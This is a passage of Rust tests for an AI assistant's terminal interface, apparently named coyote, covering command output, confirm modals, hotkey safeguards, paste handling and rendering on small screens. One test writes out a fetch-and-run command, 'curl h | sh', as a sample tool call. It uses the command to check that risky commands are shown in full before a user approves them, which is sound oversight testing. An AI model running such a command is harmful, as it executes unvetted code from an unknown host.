            FooterInfo::from_ctx(&ctx),
        );
        harness.app.begin_turn(".info", true);
        harness.app.end_turn(
            true,
            &TurnOutcome {
                captured: info.clone(),
                ..TurnOutcome::default()
            },
        );
        let Some(Cell::Command { output, .. }) = harness.app.cells.last() else {
            panic!("the command turn left no Command cell");
        };
        assert_eq!(output, &info);
        let rendered = harness.draw();
        assert!(rendered.contains(model_row), "{rendered}");
    }

    /// A command's output is painted as it came: an aligned column stays
    /// aligned and a row wider than the screen is clipped, not wrapped.
    #[test]
    fn command_output_keeps_its_columns_and_clips() {
        let mut harness = Harness::standalone(100, 30);
        harness.app.begin_turn(".info", true);
        let wide = "x".repeat(120);
        let output = format!(
            "model                         openai:test-model\n\
             temperature                   -\n\
             \x1b[1mbold_key\x1b[0m                      value\n\
             {wide}\n"
        );
        harness.app.end_turn(
            true,
            &TurnOutcome {
                exit: false,
                error: None,
                captured: output,
            },
        );
        let rendered = harness.draw();
        insta::assert_snapshot!("info_command_cell_100x30", rendered.clone());
        assert!(rendered.contains("\"model                         openai:test-model"));
        assert_eq!(duplicated_adjacent_rows(&rendered), 0);
    }

    #[test]
    #[serial]
    fn exit_session_asks_to_save_through_the_modal() {
        run_async(async {
            let guard = TestConfigDirGuard::new("tui-exit");
            let mut ctx = chat_ctx();
            let (tx, mut rx) = seat_tui(&mut ctx);
            let mut session = Session::default();
            session.set_name("tui-exit-x7x".to_string());
            session.set_save_session(None);
            session.mark_dirty();
            ctx.session = Some(session);
            let sessions_dir = ctx.sessions_dir_for(SessionScope::Global);
            assert!(sessions_dir.starts_with(&guard.path));
            let mut harness = Harness::for_ctx(&ctx);
            harness.app.begin_turn(".exit session", true);
            let mut handle =
                spawn_turn(ctx, create_abort_signal(), ".exit session".to_string(), tx);

            loop {
                tokio::select! {
                    biased;
                    Some(msg) = rx.recv() => {
                        let prompt = matches!(msg, UiMsg::Prompt { .. });
                        harness.app.handle_msg(msg);
                        if prompt {
                            break;
                        }
                    }
                    joined = &mut handle => panic!("the turn ended without asking: {:?}", joined.unwrap().1),
                }
            }
            let prompt = harness.app.prompts.front().unwrap();
            assert_eq!(prompt.req.question, "Save session?");
            assert_eq!(
                prompt.kind(),
                ModalKind::Confirm {
                    default: false,
                    tool: false
                }
            );
            insta::assert_snapshot!("exit_session_save_modal", harness.draw());

            harness.clock.advance(HOTKEY_IDLE);
            assert_eq!(harness.press(KeyCode::Char('y')), None);
            assert!(harness.app.prompts.is_empty());
            let (_returned, outcome) = handle.await.unwrap();
            assert!(!outcome.exit);
            assert_eq!(outcome.error, None);
            assert!(
                sessions_dir.join("tui-exit-x7x.yaml").is_file(),
                "{outcome:?}"
            );
        });
    }

    /// A tool sleeping on the work task never stalls the composer, even on
    /// a runtime with a single worker: the frame timer fires, and the keys
    /// and a resize handled meanwhile are drawn, while the tool is still
    /// running. The tool goes through `spawn_work` like a real turn; had
    /// it sat on the lone worker, the time driver would wait out the whole
    /// sleep and the frame with it.
    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 1)]
    #[serial]
    async fn the_composer_stays_responsive_while_a_tool_sleeps() {
        use crate::function::{ToolIo, run_llm_function};
        use std::collections::HashMap;
        use std::fs;
        use std::os::unix::fs::PermissionsExt;

        const SLEEP: Duration = Duration::from_secs(2);
        let _guard = TestConfigDirGuard::new("tui-sleep");
        let bin = crate::config::paths::functions_bin_dir();
        fs::create_dir_all(&bin).unwrap();
        let tool = bin.join("sleep_x7x");
        fs::write(
            &tool,
            format!("#!/usr/bin/env bash\nsleep {}\n", SLEEP.as_secs()),
        )
        .unwrap();
        fs::set_permissions(&tool, fs::Permissions::from_mode(0o755)).unwrap();

        // The frame timer is what is under test, so the app runs on the
        // real clock rather than the harness's manual one.
        let footer = FooterInfo {
            model: "openai:test-model".to_string(),
            ..FooterInfo::default()
        };
        let mut app = App::new(
            Arc::new(SystemClock),
            plain_config(),
            Arc::new(PromptMemory::default()),
            footer,
        )
        .unwrap();
        let mut terminal = Terminal::new(TestBackend::new(80, 24)).unwrap();
        let (tx, _rx) = unbounded_channel();
        app.begin_turn("run the tool", false);
        let started = Instant::now();
        let handle = spawn_work(async move {
            run_llm_function(
                "sleep_x7x".to_string(),
                vec![],
                HashMap::from([("TERM".to_string(), "dumb".to_string())]),
                None,
                None,
                ToolIo::new(Arc::new(TuiSink::new(tx)), None, 0),
                None,
            )
        });

        for c in "hello".chars() {
            app.handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
        }
        terminal.backend_mut().resize(60, 20);
        app.handle_input(TermInput::Resize);
        app.schedule_frame();
        app.frames.next_frame().await;
        let frame_at = started.elapsed();
        assert!(
            frame_at < SLEEP / 4,
            "the frame waited {frame_at:?} on the sleeping tool"
        );
        assert!(!handle.is_finished(), "the tool finished in {frame_at:?}");
        terminal.draw(|frame| app.render(frame)).unwrap();
        app.frames.frame_drawn();
        let rendered = terminal.backend().to_string();
        assert_eq!(app.composer_text(), "hello");
        // The app runs on the real clock here, so the elapsed seconds in
        // the status row depend on the host's speed.
        insta::with_settings!({ filters => vec![(r"Working \. \d+s", "Working . [N]s")] }, {
            insta::assert_snapshot!("sleeping_tool_composer_responsive_60x20", rendered);
        });

        handle.await.unwrap().unwrap();
        assert!(started.elapsed() >= SLEEP);
    }

    #[test]
    fn confirm_modal_hotkeys_answer_the_asking_thread() {
        for (key, expected) in [
            (KeyCode::Char('y'), PromptAnswer::Confirmed(true)),
            (KeyCode::Char('n'), PromptAnswer::Confirmed(false)),
            (KeyCode::Esc, PromptAnswer::Cancelled),
            (KeyCode::Enter, PromptAnswer::Confirmed(true)),
        ] {
            let mut harness = Harness::standalone(80, 24);
            let asker = ask_on_a_thread(&mut harness, confirm_request(None));
            assert_eq!(harness.press(key), None);
            assert_eq!(asker.join().unwrap().unwrap(), expected, "{key:?}");
            assert!(harness.app.prompts.is_empty());
        }
    }

    #[test]
    fn a_hotkey_right_after_typing_is_not_an_answer() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        harness.clock.advance(Duration::from_millis(200));
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!asker.is_finished());
        harness.clock.advance(Duration::from_millis(800));
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert_eq!(harness.app.composer_text(), "draft");
    }

    /// Answering one question re-arms the idle gate for the next queued
    /// one: a `y` held down or pressed twice answers only the first.
    #[test]
    fn a_hotkey_right_after_answering_does_not_answer_the_next_queued_prompt() {
        let mut harness = Harness::standalone(80, 24);
        let first = ask_on_a_thread(&mut harness, confirm_request(None));
        let second = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
        assert_eq!(harness.app.prompts.len(), 2);

        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            first.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert_eq!(harness.app.prompts.len(), 1);

        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!second.is_finished());

        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            second.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert!(harness.app.prompts.is_empty());
    }

    /// Enter that submits a line is a keystroke for the idle gate: a confirm
    /// raised by the turn just submitted is not answered by a repeated Enter.
    #[test]
    fn enter_right_after_submitting_does_not_answer_a_fresh_confirm() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("call the tool");
        harness.clock.advance(HOTKEY_IDLE);
        assert!(matches!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit(_))
        ));
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!asker.is_finished());
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    /// A paste while a confirm is up has nowhere visible to go: the modal
    /// has no field and the composer is hidden under it.
    #[test]
    fn a_paste_under_a_confirm_is_dropped() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        harness
            .app
            .handle_input(TermInput::Paste("pasted-p3x".to_string()));
        assert_eq!(harness.app.composer_text(), "draft");
        assert_eq!(harness.app.prompts.len(), 1);
        harness.clock.advance(HOTKEY_IDLE);
        harness.press(KeyCode::Esc);
        assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
    }

    /// A paste keeps its line breaks whichever line end the terminal
    /// used: CR, CRLF and LF all split the composer the same way.
    #[test]
    fn a_paste_with_carriage_returns_lands_line_by_line() {
        let mut harness = Harness::standalone(80, 24);
        harness
            .app
            .handle_input(TermInput::Paste("a\rb\r\nc\nd".to_string()));
        assert_eq!(harness.app.composer.lines(), ["a", "b", "c", "d"]);
        assert!(
            !harness.app.composer_text().contains('\r'),
            "{:?}",
            harness.app.composer_text()
        );
    }

    /// Enter tapped while the turn runs maps to nothing, but it is still
    /// a keystroke for the idle gate: a confirm appearing right after one
    /// is not answered by the next tap of the same key.
    #[test]
    fn enter_ignored_during_a_turn_still_arms_the_idle_gate_for_a_fresh_confirm() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("call the tool");
        harness.clock.advance(HOTKEY_IDLE);
        assert!(matches!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit(_))
        ));
        harness.app.begin_turn("call the tool", false);
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);

        harness.clock.advance(Duration::from_millis(200));
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!asker.is_finished());

        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    #[test]
    fn yes_for_this_session_answers_and_is_remembered_for_the_tool() {
        let mut harness = Harness::standalone(80, 24);
        let req = confirm_request(Some("fs_write"));
        assert_eq!(harness.app.prompt_memory.auto_answer(&req), None);
        let asker = ask_on_a_thread(&mut harness, req.clone());
        assert!(harness.draw().contains("tool: fs_write"));
        assert_eq!(harness.press(KeyCode::Char('a')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert_eq!(harness.app.prompt_memory.auto_answer(&req), Some(true));
    }

    #[test]
    fn an_input_modal_types_into_its_own_field_and_sends_it() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        let req = PromptRequest::new(PromptAction::Input, "Session name:", Origin::detached());
        let asker = ask_on_a_thread(&mut harness, req);
        harness.type_text("notes");
        let frame = harness.draw();
        insta::assert_snapshot!("input_modal_80x24", frame);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Text("notes".to_string())
        );
        assert_eq!(harness.app.composer_text(), "draft");
    }

    #[test]
    fn unsupported_prompt_kinds_are_cancelled_at_once() {
        let mut harness = Harness::standalone(80, 24);
        let req = PromptRequest::new(PromptAction::Select, "Pick one", Origin::detached());
        let asker = ask_on_a_thread(&mut harness, req);
        assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
        assert!(harness.app.prompts.is_empty());
        assert!(matches!(
            harness.app.cells.last(),
            Some(Cell::Notice {
                kind: NoticeKind::ToolWarning,
                ..
            })
        ));
    }

    /// With nobody left to answer, every yes/no question is refused
    /// whatever default the asker supplied, coyote's own included, and
    /// anything else is cancelled, whether the prompter is already marked
    /// unattended or the question was queued when the UI gave up.
    #[test]
    fn unattended_prompts_refuse_every_confirm_and_cancel_the_rest() {
        let (tx, _rx) = unbounded_channel();
        let prompter = TuiPrompter::new(tx, Arc::new(AtomicBool::new(true)));
        let save = PromptRequest {
            default: Some(serde_json::json!(false)),
            ..confirm_request(None)
        };
        assert_eq!(
            prompter.prompt(save).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        let opt_in = PromptRequest {
            default: Some(serde_json::json!(true)),
            ..confirm_request(None)
        };
        assert_eq!(
            prompter.prompt(opt_in).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        assert_eq!(
            prompter.prompt(confirm_request(Some("fs_write"))).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        let tool_opt_in = PromptRequest {
            default: Some(serde_json::json!(true)),
            ..confirm_request(Some("fs_write"))
        };
        assert_eq!(
            prompter.prompt(tool_opt_in).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        let input = PromptRequest::new(PromptAction::Input, "Name:", Origin::detached());
        assert_eq!(prompter.prompt(input).unwrap(), PromptAnswer::Cancelled);

        let mut harness = Harness::standalone(80, 24);
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        harness.app.abandon_prompts();
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(false)
        );
    }

    /// Once the UI has given up, a question already in the inbox and one
    /// raised while the work task is still being waited for are both
    /// answered unattended; the asker never sits on the reply until the
    /// deadline. The second question is only asked once the first has
    /// its answer, which the drain gives it, so it has to reach the wait.
    #[tokio::test]
    async fn prompts_raised_after_the_ui_gave_up_are_answered_unattended() {
        let (tx, mut rx) = unbounded_channel();
        let prompter = Arc::new(TuiPrompter::new(tx, Arc::new(AtomicBool::new(false))));

        let queued = Arc::clone(&prompter);
        let early = std::thread::spawn(move || queued.prompt(confirm_request(None)));
        while rx.is_empty() {
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
        let late = Arc::clone(&prompter);
        let handle = tokio::task::spawn_blocking(move || {
            let early_answer = early.join().unwrap();
            let answer = late.prompt(PromptRequest {
                default: Some(serde_json::json!(true)),
                ..confirm_request(None)
            });
            (answer, early_answer)
        });
        let started = Instant::now();
        let Join::Finished((late_answer, early_answer)) =
            join_unattended(handle, &mut rx, EXIT_CANCEL_WAIT).await
        else {
            panic!("the work task finished well inside the deadline");
        };
        assert!(started.elapsed() < EXIT_CANCEL_WAIT);
        assert_eq!(early_answer.unwrap(), PromptAnswer::Confirmed(false));
        assert_eq!(late_answer.unwrap(), PromptAnswer::Confirmed(false));
    }

    /// A work task that never finishes is given up on at the deadline:
    /// the wait reports a timeout rather than following the task. The
    /// caller then has a task still running and no context, which is the
    /// case `run` ends the process for.
    #[tokio::test(start_paused = true)]
    async fn join_unattended_gives_up_at_the_deadline() {
        let (_tx, mut rx) = unbounded_channel();
        let handle = tokio::spawn(std::future::pending::<()>());
        let deadline = Duration::from_millis(50);
        let started = tokio::time::Instant::now();
        assert!(matches!(
            join_unattended(handle, &mut rx, deadline).await,
            Join::TimedOut
        ));
        assert!(started.elapsed() >= deadline);
    }

    /// A work task that panics while the UI waits on it is told apart
    /// from one that ran out of time: the panic comes back as such, with
    /// its message, instead of being reported as a task left behind.
    #[tokio::test]
    async fn join_unattended_reports_a_panicking_task_as_panicked() {
        let (_tx, mut rx) = unbounded_channel();
        let handle = tokio::task::spawn_blocking(|| -> () { panic!("boom-j4p") });
        let Join::Panicked(err) = join_unattended(handle, &mut rx, EXIT_CANCEL_WAIT).await else {
            panic!("the panic was not reported as one");
        };
        assert!(err.is_panic(), "{err}");
        let payload = err.into_panic();
        assert_eq!(payload.downcast_ref::<&str>(), Some(&"boom-j4p"));
    }

    /// A SIGTERM latched while the terminal was released survives the
    /// discard that follows a shell-out, which is for the editor's Ctrl+C
    /// only, and still ends the loop at the next select. The handler is
    /// armed before the raise, so the signal cannot reach the default
    /// disposition.
    #[cfg(unix)]
    #[tokio::test]
    #[serial]
    async fn discard_pending_keeps_a_latched_sigterm() {
        let mut termination = Termination::arm().unwrap();
        // SAFETY: raise takes a signal number and no pointers.
        unsafe { libc::raise(libc::SIGTERM) };
        tokio::time::sleep(Duration::from_millis(100)).await;
        termination.discard_pending();
        tokio::time::timeout(Duration::from_secs(2), termination.recv())
            .await
            .expect("the SIGTERM was discarded along with the editor's Ctrl+C");
    }

    /// One worker, and the work task blocks its thread for longer than the
    /// frame is due in: the frame still fires on time, because the task
    /// runs on the blocking pool and the lone worker stays free to service
    /// the time driver. Spawned onto the worker instead, the frame would
    /// wait out the whole block.
    #[tokio::test(flavor = "multi_thread", worker_threads = 1)]
    async fn a_blocking_work_task_does_not_starve_the_frame_timer() {
        const BLOCK: Duration = Duration::from_millis(300);
        let mut frames = FrameScheduler::new(Arc::new(SystemClock));
        let work = spawn_work(async { std::thread::sleep(BLOCK) });
        frames.schedule_frame_in(Duration::from_millis(10));
        let started = Instant::now();
        frames.next_frame().await;
        let waited = started.elapsed();
        assert!(
            waited < BLOCK / 2,
            "the frame waited {waited:?} for a {BLOCK:?} block on the work task"
        );
        work.await.unwrap();
    }

    /// A panic message reaches the loop as late output while the task is
    /// still unwinding, and the loop usually feeds it to the app before
    /// the join error arrives. The app hands back exactly those notices,
    /// and only the lost turn's, so the restored terminal still shows them.
    #[test]
    fn the_lost_turns_late_output_is_handed_back_for_printing() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.handle_msg(UiMsg::Notice {
            kind: NoticeKind::Routing,
            text: "from an earlier turn".to_string(),
        });
        assert!(harness.app.turn_late_output().is_empty());

        harness.app.begin_turn("explode", false);
        let (tx, mut rx) = unbounded_channel();
        late_output(tx)("thread 'tokio' panicked at src/x.rs:1:1:\nboom-r7x\n".to_string());
        harness.app.handle_msg(rx.try_recv().unwrap());
        harness.app.handle_msg(UiMsg::Notice {
            kind: NoticeKind::ToolWarning,
            text: "unrelated".to_string(),
        });
        let late = harness.app.turn_late_output();
        assert_eq!(late.len(), 1, "{late:?}");
        assert!(late[0].contains("boom-r7x"), "{late:?}");
        assert!(late[0].contains("panicked"), "{late:?}");
    }

    /// A background job still writing after its turn ended shares one
    /// trailing cell per call, bounded in bytes, instead of a cell per
    /// pipe read.
    #[test]
    fn out_of_turn_tool_output_shares_one_bounded_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.app.end_turn(false, &TurnOutcome::default());
        let cells_before = harness.app.cells.len();
        harness
            .app
            .append_tool_output(Some("bg".to_string()), b"first-q7k\n");
        harness
            .app
            .append_tool_output(Some("bg".to_string()), b"second-q7k\n");
        assert_eq!(harness.app.cells.len(), cells_before + 1);
        let Some(Cell::Text { lines, .. }) = harness.app.cells.last() else {
            panic!("the output did not land in a text cell");
        };
        assert_eq!(lines, &["first-q7k", "second-q7k"]);

        let line = format!("{}\n", "z".repeat(LATE_OUTPUT_LIMIT / 4));
        for _ in 0..12 {
            harness
                .app
                .append_tool_output(Some("bg".to_string()), line.as_bytes());
        }
        assert_eq!(harness.app.cells.len(), cells_before + 1);
        let Some(Cell::Text { lines, .. }) = harness.app.cells.last() else {
            panic!("the output did not stay in its text cell");
        };
        let total: usize = lines.iter().map(|line| line.len() + 1).sum();
        assert!(total <= LATE_OUTPUT_LIMIT, "{total} bytes kept");
        assert!(
            !lines.iter().any(|line| line.contains("q7k")),
            "the oldest lines were kept"
        );
    }

    /// A leftover writer's chunks fold into one cell that keeps its
    /// newest text, so a chatty child cannot grow the transcript by a
    /// cell per write.
    #[test]
    fn late_output_chunks_share_one_bounded_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        let (tx, mut rx) = unbounded_channel();
        let late = late_output(tx);
        late("first-k1q\n".to_string());
        late("second-k1q\n".to_string());
        while let Ok(msg) = rx.try_recv() {
            harness.app.handle_msg(msg);
        }
        assert_eq!(harness.app.cells.len(), 2);
        assert_eq!(harness.app.turn_late_output(), ["first-k1q\nsecond-k1q"]);

        late("x".repeat(LATE_OUTPUT_LIMIT));
        harness.app.handle_msg(rx.try_recv().unwrap());
        let kept = harness.app.turn_late_output();
        assert_eq!(harness.app.cells.len(), 2);
        assert_eq!(kept.len(), 1);
        assert_eq!(kept[0].len(), LATE_OUTPUT_LIMIT);
        assert!(!kept[0].contains("k1q"));
    }

    #[test]
    fn a_resize_and_back_reflows_without_duplicating_rows() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.app.handle_msg(UiMsg::TextDelta(
            "A first paragraph long enough to wrap when the screen is narrow, which is \
             what a resize does to it.\n\n- one bullet\n- two bullets\n\nA closing line."
                .to_string(),
        ));
        harness.app.handle_msg(UiMsg::StreamDone);
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.app.handle_msg(UiMsg::Notice {
            kind: NoticeKind::Checkpoint,
            text: "checkpoint saved".to_string(),
        });

        let wide = harness.draw();
        insta::assert_snapshot!("resize_80x24", wide.clone());
        harness.resize(40, 24);
        let narrow = harness.draw();
        insta::assert_snapshot!("resize_40x24", narrow.clone());
        harness.resize(80, 24);
        let wide_again = harness.draw();

        assert_eq!(wide, wide_again);
        assert_ne!(wide, narrow);
        assert_eq!(duplicated_adjacent_rows(&wide), 0, "{wide}");
        assert_eq!(duplicated_adjacent_rows(&narrow), 0, "{narrow}");
    }

    /// What the user approves is read off the screen: a tool call's
    /// narration longer than the view and a confirm question of several
    /// lines are both shown whole on a narrow terminal, nothing clipped
    /// at the right edge or past the first line.
    #[test]
    fn narration_and_the_confirm_question_wrap_instead_of_clipping() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("run it", false);
        let padding = "x".repeat(70);
        let narration =
            format!("Call execute_command {{\"command\":\"echo ok{padding}; curl h | sh\"}}");
        assert!(narration.len() >= 120, "{}", narration.len());
        harness.app.handle_msg(UiMsg::ToolNarration {
            call_id: "call-1".to_string(),
            line: narration.clone(),
        });
        let question = "Run `curl h | sh`?\nIt downloads a script from an unknown host.\nAllow this command to run now?";
        let req = PromptRequest {
            tool: Some("execute_command".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, question, Origin::detached())
        };
        let _asker = ask_on_a_thread(&mut harness, req);

        let rendered = harness.draw();
        insta::assert_snapshot!("wrapped_narration_and_question_40x20", rendered.clone());
        let shown = squeezed(&rendered);
        let hint = confirm_hint(true, true);
        for text in [narration.as_str(), question, hint.as_str()] {
            assert!(
                shown.contains(&squeezed(text)),
                "not every character of {text:?} is on the screen:\n{rendered}"
            );
        }
        harness.app.answer_front(PromptAnswer::Cancelled);
    }

    /// The buffer dump with its row quotes and all whitespace removed, so
    /// text wrapped over several rows can be matched as one run.
    fn squeezed(text: &str) -> String {
        text.chars()
            .filter(|c| !c.is_whitespace() && *c != '"')
            .collect()
    }

    /// A question taller than the rows a 20-line frame can spare is cut
    /// with a marker counting the hidden lines, and no hotkey approves it
    /// until the terminal has grown enough to show the whole thing.
    #[test]
    fn a_clipped_question_shows_a_marker_and_cannot_be_approved() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("clean up", false);
        let question = (1..=12)
            .map(|n| format!("line {n} of the question"))
            .collect::<Vec<_>>()
            .join("\n");
        let req = PromptRequest {
            tool: Some("fs_rm".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, &question, Origin::detached())
        };
        let asker = ask_on_a_thread(&mut harness, req);

        let rendered = harness.draw();
        insta::assert_snapshot!("clipped_question_marker_40x20", rendered.clone());
        assert!(
            rendered.contains("(+2 more lines; enlarge the terminal)"),
            "{rendered}"
        );
        assert!(!rendered.contains("line 11 of"), "{rendered}");
        assert!(
            squeezed(&rendered).contains("Esc=cancelenlargetheterminaltoanswer"),
            "{rendered}"
        );
        assert!(!rendered.contains("y = yes"), "{rendered}");
        harness.clock.advance(HOTKEY_IDLE);
        for key in [KeyCode::Char('y'), KeyCode::Char('a'), KeyCode::Enter] {
            assert_eq!(harness.press(key), None);
            assert_eq!(
                harness.app.prompts.len(),
                1,
                "{key:?} answered a clipped question"
            );
        }
        assert!(!asker.is_finished());

        harness.resize(40, 24);
        let rendered = harness.draw();
        assert!(!rendered.contains("more lines"), "{rendered}");
        assert!(
            squeezed(&rendered).contains(&squeezed(&question)),
            "{rendered}"
        );
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    /// A frame too short for status, modal and footer squeezes the
    /// question below the rows its cap promised; the rows it actually
    /// received decide, so nothing approves it until the terminal grows.
    #[test]
    fn a_question_squeezed_by_a_tiny_frame_cannot_be_approved() {
        let mut harness = Harness::standalone(40, 5);
        harness.app.begin_turn("clean up", false);
        let question = "line 1 of the question\nline 2 of the question\nline 3 of the question";
        let req = PromptRequest {
            tool: Some("fs_rm".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, question, Origin::detached())
        };
        let asker = ask_on_a_thread(&mut harness, req);
        harness.draw();
        let given = harness.app.question_area.expect("the modal was drawn");
        assert!(given.height < 3, "{given:?}");
        harness.clock.advance(HOTKEY_IDLE);
        for key in [KeyCode::Char('y'), KeyCode::Char('a'), KeyCode::Enter] {
            assert_eq!(harness.press(key), None);
            assert_eq!(
                harness.app.prompts.len(),
                1,
                "{key:?} answered a squeezed question"
            );
        }
        assert!(!asker.is_finished());

        harness.resize(40, 24);
        let rendered = harness.draw();
        assert!(rendered.contains("line 3 of the question"), "{rendered}");
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    /// A tool-controlled path in the question is shown whole: on 40 columns
    /// a 300-character path wraps over several rows and every character of
    /// it is on screen before `y` can approve it.
    #[test]
    fn a_long_path_in_the_confirm_question_is_shown_whole() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("remove it", false);
        let path = format!(
            "/tmp/{}/{}/{}",
            "a".repeat(100),
            "b".repeat(100),
            "c".repeat(93)
        );
        assert_eq!(path.len(), 300);
        let question = format!("Remove '{path}'?");
        let req = PromptRequest {
            tool: Some("fs_rm".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, &question, Origin::detached())
        };
        let asker = ask_on_a_thread(&mut harness, req);

        let rendered = harness.draw();
        insta::assert_snapshot!("long_path_confirm_40x20", rendered.clone());
        assert!(
            squeezed(&rendered).contains(&squeezed(&question)),
            "{rendered}"
        );
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    #[test]
    fn every_widget_survives_a_tiny_screen() {
        for (width, height) in [(1, 1), (0, 0), (3, 2)] {
            let mut harness = Harness::standalone(width, height);
            harness.app.begin_turn("hi", false);
            harness
                .app
                .handle_msg(UiMsg::TextDelta("reply".to_string()));
            harness
                .app
                .handle_msg(UiMsg::UsageUpdated("12 tokens".to_string()));
            harness.render();
            let _asker = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
            harness.render();
            harness.press(KeyCode::Esc);
        }
    }

    #[test]
    fn the_footer_strips_the_right_prompt_colours() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.handle_msg(UiMsg::UsageUpdated(
            "\x1b[36m[low] \x1b[35m$0.0012 \x1b[0m".to_string(),
        ));
        let rendered = harness.draw();
        assert!(rendered.contains("[low] $0.0012"), "{rendered}");
        assert!(!rendered.contains('\x1b'), "{rendered:?}");
    }

    #[test]
    fn a_pending_prefill_lands_in_the_composer_on_idle_return() {
        let mut ctx = chat_ctx();
        ctx.pending_prefill = Some("edited line".to_string());
        let mut harness = Harness::for_ctx(&ctx);
        harness.app.sync_from_ctx(&mut ctx);
        assert_eq!(harness.app.composer_text(), "edited line");
        assert_eq!(ctx.pending_prefill, None);
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit("edited line".to_string()))
        );
        assert_eq!(harness.app.composer_text(), "");
    }

    /// The elapsed-time row keeps ticking: the tick is asked for after the
    /// scheduler forgets the frame just drawn, so it is not wiped with it.
    #[test]
    fn the_status_row_ticks_once_a_second_while_a_turn_runs() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("work", false);
        harness.render();
        harness.app.frame_drawn();
        let due = harness.app.frames.due_at().expect("a tick is pending");
        harness.clock.advance(STATUS_TICK);
        assert!(due <= harness.clock.now());
        let rendered = harness.draw();
        assert!(
            rendered.contains("Working . 1s  Esc to interrupt"),
            "{rendered}"
        );

        harness.app.end_turn(false, &TurnOutcome::default());
        harness.render();
        harness.app.frame_drawn();
        assert_eq!(harness.app.frames.due_at(), None);
    }

    #[test]
    fn the_status_row_names_thinking_and_the_running_tool() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("work", false);
        harness.app.handle_msg(UiMsg::ThinkingStarted);
        harness.clock.advance(Duration::from_secs(3));
        let rendered = harness.draw();
        assert!(rendered.contains("Thinking for 3s"), "{rendered}");

        harness
            .app
            .handle_msg(UiMsg::ToolRunning(Some("fs_write".to_string())));
        let rendered = harness.draw();
        assert!(rendered.contains("Running fs_write"), "{rendered}");
        harness.app.handle_msg(UiMsg::ToolRunning(None));
        harness.app.handle_msg(UiMsg::ThinkingStopped);
        let rendered = harness.draw();
        assert!(rendered.contains("Working . 3s"), "{rendered}");
    }

    /// Once the teardown task owns the context the keys that would start
    /// something new (a line, the editor, an interrupt, another quit) are
    /// inert, typing still works, and the strip says what is happening.
    #[test]
